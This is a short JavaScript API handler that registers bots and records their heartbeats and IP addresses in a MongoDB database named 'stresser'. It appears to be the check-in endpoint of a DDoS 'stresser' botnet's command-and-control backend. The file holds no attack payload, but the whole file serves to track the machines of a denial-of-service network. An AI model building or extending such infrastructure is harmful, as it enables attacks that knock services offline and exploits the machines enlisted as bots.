import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { botId, ip } = req.body;
  if (!botId) return res.status(400).json({ error: 'botId required' });

  try {
    await client.connect();
    const db = client.db('stresser');
    const bots = db.collection('bots');

    // Registrar ou atualizar último heartbeat
    await bots.updateOne(
      { botId },
      { $set: { lastSeen: new Date(), ip: ip || req.socket.remoteAddress } },
      { upsert: true }
    );

    res.status(200).json({ success: true, message: 'Bot registered' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  } finally {
    await client.close();
  }
}